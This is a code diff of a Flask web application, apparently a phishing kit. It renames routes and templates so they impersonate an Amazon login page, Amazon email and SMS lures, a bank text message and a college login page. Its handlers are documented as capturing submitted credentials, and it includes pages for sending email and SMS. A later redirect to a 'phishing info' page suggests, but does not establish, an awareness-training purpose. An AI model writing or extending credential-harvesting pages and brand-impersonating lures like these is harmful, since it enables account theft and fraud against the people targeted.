@@ -130,9 +130,9 @@ def phishing_landing():
     except Exception as e:
         print(f"Error during visitor logging: {e}")
     
-    return render_template('login.html')
+    return render_template('amazon_login.html')
 
-@app.route("/login", methods=['POST'])
+@app.route("/amazon_login", methods=['POST'])
 def handle_login():
     """Captures credentials and redirects to the phishing info page."""
     if not supabase:
@@ -155,7 +155,7 @@ def handle_login():
         
     return redirect(url_for('phishing_info'))
 
-@app.route("/college", methods=['POST'])
+@app.route("/college_login", methods=['POST'])
 def college_login():
     """Captures credentials and redirects to the phishing info page."""
     if not supabase:
@@ -185,35 +185,40 @@ def phishing_info():
 
 # --- Messaging Sender Routes ---
 
-@app.route("/email", methods=['GET'])
+@app.route("/email_send", methods=['GET'])
 def email_sender_page():
     """Renders the email sending UI."""
-    return render_template('email.html')
+    return render_template('email_send.html')
 
-@app.route("/banktxt", methods=['GET'])
+@app.route("/bank_sms_txt", methods=['GET'])
 def bank_template_page():
-    """Renders the pre-made phishing bank template."""
-    return render_template('banktxt.html')
+    """Renders the pre-made phishing bank sms template."""
+    return render_template('bank_sms_txt.html')
 
-@app.route("/college", methods=['GET'])
-def college_template_page():
-    """Renders the pre-made phishing college template."""
-    return render_template('college.html')
+@app.route("/college_login", methods=['GET'])
+def college_login_page():
+    """Renders the phishing college login page."""
+    return render_template('college_login.html')
 
-@app.route("/sms", methods=['GET'])
+@app.route("/sms_send", methods=['GET'])
 def sms_sender_page():
     """Renders the SMS sending UI."""
-    return render_template('sms.html')
+    return render_template('sms_send.html')
 
-@app.route("/emailtxt", methods=['GET'])
+@app.route("/amazon_email", methods=['GET'])
 def email_template_page():
-    """Renders the pre-made phishing email template."""
-    return render_template('emailtxt.html')
+    """Renders the pre-made phishing amazon email template."""
+    return render_template('amazon_email.html')
 
-@app.route("/smstxt", methods=['GET'])
+@app.route("/amazon_sms_txt", methods=['GET'])
 def sms_template_page():
-    """Renders the pre-made phishing SMS template."""
-    return render_template('smstxt.html')
+    """Renders the pre-made phishing amazon SMS template."""
+    return render_template('amazon_sms_txt.html')
+
+@app.route("/amazon_login", methods=['GET'])
+def amazon_login_page():
+    """Renders the phishing amazon login page."""
+    return render_template('amazon_login.html')
 
 # --- API Routes for Sending Messages ---
 
